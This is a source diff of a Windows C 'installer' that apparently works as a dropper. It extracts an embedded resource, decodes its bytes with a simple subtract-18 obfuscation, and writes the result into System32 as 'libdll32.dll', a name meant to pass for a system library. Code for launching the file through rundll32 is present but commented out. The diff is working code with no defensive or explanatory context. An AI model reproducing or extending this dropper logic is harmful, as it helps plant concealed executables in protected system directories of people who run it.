@@ -1,85 +1,84 @@
 #include "installer.h"
-//#include "resource.h"
+#include "resource.h"
 
 #define DLL_NAME L"libdll32.dll"
 
 int main(int argc, char** argv) {
-	/*printf("Getting System Directory\n");
-	wchar_t* filePath = HI_GetSystemDirectory(FILE_NAME);
-	printf("Getting rundll32.exe Directory\n");
-	wchar_t* rundll32 = HI_GetSystemDirectory(L"rundll32.exe");
-	printf("Getting DLL Resource\n");
+	printf("Finding resource\n");
 	HRSRC resourceHandle = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
 
-	if(resourceHandle == NULL) {
-		HI_FormatError(GetLastError(), "FindResourceW()");
-		return -1;
+	if(!resourceHandle) {
+		consoleError(GetLastError(), L"FindResourceW");
+		return 1;
 	}
 
-	printf("Getting Resource Size\n");
-	DWORD size = SizeofResource(NULL, resourceHandle);
+	DWORD resourceSize = SizeofResource(NULL, resourceHandle);
 
-	if(size == NULL) {
-		HI_FormatError(GetLastError(), "SizeofResource()");
-		return -1;
+	if(!resourceSize) {
+		consoleError(GetLastError(), L"SizeofResource");
+		return 1;
 	}
 
-	printf("Resource Size: %d Bytes\n", size);
-	printf("Loading Resource\n");
+	printf("Resource size: %lu byte(s)\nLoading resource\n", resourceSize);
 	HGLOBAL resource = LoadResource(NULL, resourceHandle);
 
-	if(resource == NULL) {
-		HI_FormatError(GetLastError(), "LoadResource()");
-		return -1;
+	if(!resource) {
+		consoleError(GetLastError(), L"LoadResource");
+		return 1;
 	}
 
-	printf("Locking Resource\n");
-	BYTE* data = static_cast<BYTE*>(LockResource(resource));
+	BYTE* data = LockResource(resource);
 
-	if(data == NULL) {
-		HI_FormatError(GetLastError(), "LockResource()");
-		return -1;
+	if(!data) {
+		consoleError(GetLastError(), L"LockResource");
+		return 1;
 	}
 
-	printf("Allocate Memory for Offsetting\n");
-	BYTE* offsetted = static_cast<BYTE*>(malloc(size * sizeof(BYTE)));
+	BYTE* buffer = malloc(resourceSize);
 
-	if(offsetted == NULL) {
-		HI_FormatError(ERROR_NOT_ENOUGH_MEMORY, "malloc()");
-		return -1;
+	if(!buffer) {
+		consoleError(GetLastError(), L"malloc");
+		return 1;
 	}
 
-	printf("Offsetting Bytes\n");
+	printf("Allocate memory: %lu byte(s)\n", resourceSize);
 
-	for(DWORD i = 0; i < size; i++) {
-		offsetted[i] = (data[i] - 18) % 0xFF;
+	for(DWORD i = 0; i < resourceSize; i++) {
+		buffer[i] = (data[i] - 18) % 0xFF;
 	}
 
-	printf("Creating/Opening File\n");
-	HANDLE file = CreateFileW(filePath, GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	wchar_t* system32 = getSystem32Directory();
+	printf("System32: %ws\n", system32);
+	wchar_t* dllFile = mergePath(system32, DLL_NAME);
+	printf("DLL: %ws\nCreate file\n", dllFile);
+	HANDLE file = CreateFileW(dllFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if(file == INVALID_HANDLE_VALUE) {
-		HI_FormatError(GetLastError(), "CreateFileW()");
-		return -1;
+		consoleError(GetLastError(), L"CreateFileW");
+		return 1;
 	}
 
 	DWORD written = 0;
-	printf("Writing File\n");
-
-	if(WriteFile(file, offsetted, size, &written, NULL) == NULL) {
-		HI_FormatError(GetLastError(), "WriteFile()");
-		return -1;
+	
+	if(!WriteFile(file, buffer, resourceSize, &written, NULL)) {
+		consoleError(GetLastError(), L"WriteFile");
+		return 1;
 	}
 
-	printf("Total Size: %d\nBytes Written: %d\n", size, written);
-	printf("Closing File\n");
+	printf("Size:    %lu byte(s)\nWritten: %lu byte(s)\n", resourceSize, written);
 
-	if(CloseHandle(file) == NULL) {
-		HI_FormatError(GetLastError(), "CloseHandle()");
-		return -1;
+	if(!CloseHandle(file)) {
+		consoleError(GetLastError(), L"CloseHandle");
+		return 1;
 	}
 
-	STARTUPINFO startupInformation = {0};
+	printf("File closed\n");
+	//wchar_t* rundll32File = mergePath(system32, L"rundll32.exe");
+	//printf("rundll32: %ws\n", rundll32File);
+	free(system32);
+	//free(rundll32File);
+	free(dllFile);
+	/*STARTUPINFO startupInformation = {0};
 	startupInformation.cb = sizeof(STARTUPINFO);
 	PROCESS_INFORMATION processInformation = {0};
 	std::wstring argument(rundll32);
@@ -106,10 +105,5 @@ int main(int argc, char** argv) {
 		return -1;
 	}*/
 
-	wchar_t* system32 = getSystem32Directory();
-	wchar_t* dllFile = mergePath(system32, DLL_NAME);
-	printf("Root: %ws\nDLL: %ws\n", system32, dllFile);
-	free(system32);
-	free(dllFile);
 	return 0;
 }
